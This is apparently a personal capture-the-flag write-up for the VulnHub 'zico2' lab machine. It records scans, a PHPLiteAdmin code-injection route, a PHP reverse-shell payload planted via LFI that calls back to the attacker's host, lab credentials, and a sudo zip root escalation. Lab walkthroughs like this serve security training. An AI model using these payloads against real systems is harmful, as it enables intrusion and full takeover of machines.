# BOX NAME: zico2
**LINK**:  https://www.vulnhub.com/entry/zico2-1,210/#download

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box to find a phpliteadmin interface. Find a exploit to this application
2. run a reverse shell via a newly created DB. First you need to find it via LFI.
3. Enumerate box to find credentials in database-file.
4. Pivot to zico-user. User may run few commands as root.
5. GTFO-bin.

This box was fun and pretty easy. Took me roughly an hour to compromise the box, get root, and do this writeup. I was messing around with the SQL-query to get the rev-shell to work.
Otherwise, pretty cool box.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.77
[+] URL:	http://zico.com
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -p- $IP -oN nmap-zico.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:16 CEST
Nmap scan report for zico.com (10.77.0.77)
Host is up (0.00058s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
111/tcp   open  rpcbind 2-4 (RPC #100000)
49524/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.18 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
http://zico.com [200 OK] Apache[2.2.22], Bootstrap, Country[RESERVED][ZZ], Email[feedback@startbootstrap.com,your-email@your-domain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.77.0.77], JQuery, Script, Title[Zico's Shop], X-UA-Compatible[IE=edge]

```

nikto-scan
```
└─$ nikto -h $IP | tee nikto-zico.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.77
+ Target Hostname:    10.77.0.77
+ Target Port:        80
+ Start Time:         2023-06-06 21:17:09 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 3803593, size: 7970, mtime: Thu Jun  8 21:18:30 2017. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /view.php?ariadne=http://blog.cirt.net/rfiinc.txt?: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ /README.md: Readme Found.
+ 8881 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2023-06-06 21:17:31 (GMT2) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

fuzzing
```
/dbadmin/test_db.php - default password = ADMIN -->> PHPLiteAdmin 1.9.3 - Remote PHP Code Injection | php/webapps/24044.txt

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. Locate the phpliteadmin interface -> create a database with phpcode named hack.php
	<?php $sock=fsockopen("10.77.0.35",443);$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
2. Locate newly created database. There's and LFI on view.php.
3. Get reverse shell.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/etc
--> 4.0K drwxr-s---  2 root dip    4.0K Jun  1  2017 chatscripts

/usr:
total 72K
4.0K drwxrwxrwx  2 root root 4.0K Jun  6 20:19 databases

www-data@zico:/home/zico$ cat to_do.txt
try list:
- joomla
- bootstrap (+phpliteadmin)
- wordpress


```

**SUID's**:

```
www-data@zico:/var$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/sudoedit
/usr/bin/at
/sbin/mount.nfs
/bin/fusermount
/bin/umount
/bin/ping6
/bin/su
/bin/mount
/bin/ping

```
**SGID's**:

```
www-data@zico:/var$ find / -perm -g=s -type f 2>/dev/null
/usr/sbin/uuidd
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/mlocate
/usr/bin/mail-touchlock
/usr/bin/dotlockfile
/usr/bin/wall
/usr/bin/ssh-agent
/usr/bin/mail-lock
/usr/bin/mail-unlock
/usr/bin/expiry
/usr/bin/chage
/usr/bin/at
/sbin/unix_chkpwd

```
**OTHERS**:

```
define('DB_NAME', 'zico');
define('DB_USER', 'zico');
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
define('DB_HOST', 'zico');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');


zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x22aaca9f1cf671f1833596d2d3a06c99176d9d33, stripped
 

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.5 LTS
Release:        12.04
Codename:       precise


Linux zico 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
phpliteadmin:admin
zico:zico2215@
root:34kroot34
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
653F4B285089453FE00E2AAFAC573414:zico2215@
653F4B285089453FE00E2AAFAC573414:34kroot34
```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
zico@zico:~$ sudo zip anything /etc/hosts -T -TT 'sh #'
```

```
# cat flag.txt
#
#
#
# ROOOOT!
# You did it! Congratz!
# 
# Hope you enjoyed! 
# 
# 
#
#
```

</details>